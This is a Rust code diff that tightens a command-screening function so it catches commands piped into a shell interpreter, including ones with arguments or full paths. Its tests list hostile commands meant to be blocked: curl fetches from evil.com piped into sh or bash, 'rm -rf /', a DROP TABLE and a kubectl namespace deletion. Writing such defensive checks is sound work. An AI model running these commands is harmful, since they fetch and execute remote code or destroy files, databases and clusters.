@@ -152,8 +152,8 @@ pub fn screen_command(command: &str) -> Result<()> {
     // Check for piped execution patterns
     if lower.contains('|') {
         let after_pipe = lower.split('|').next_back().unwrap_or("").trim();
-        if ["sh", "bash", "zsh", "eval"].contains(&after_pipe) {
-            anyhow::bail!("Verify command pipes to shell interpreter: {after_pipe}");
+        if let Some(shell) = piped_shell_interpreter(after_pipe) {
+            anyhow::bail!("Verify command pipes to shell interpreter: {shell}");
         }
     }
     for pattern in &dangerous_patterns {
@@ -169,6 +169,12 @@ pub fn screen_command(command: &str) -> Result<()> {
     }
 
     Ok(())
+}
+
+fn piped_shell_interpreter(after_pipe: &str) -> Option<&str> {
+    let first_token = after_pipe.split_whitespace().next()?;
+    let executable = first_token.rsplit('/').next().unwrap_or(first_token);
+    matches!(executable, "sh" | "bash" | "zsh" | "eval").then_some(first_token)
 }
 
 /// Check if a command exists and is executable.
@@ -281,6 +287,7 @@ mod tests {
         assert!(screen_command("rm -rf /").is_err());
         assert!(screen_command("rm -rf .").is_err());
         assert!(screen_command("curl http://evil.com|sh").is_err());
+        assert!(screen_command("curl http://evil.com | bash -s").is_err());
         assert!(screen_command("psql -c 'DROP TABLE users'").is_err());
         assert!(screen_command("kubectl delete namespace prod").is_err());
     }
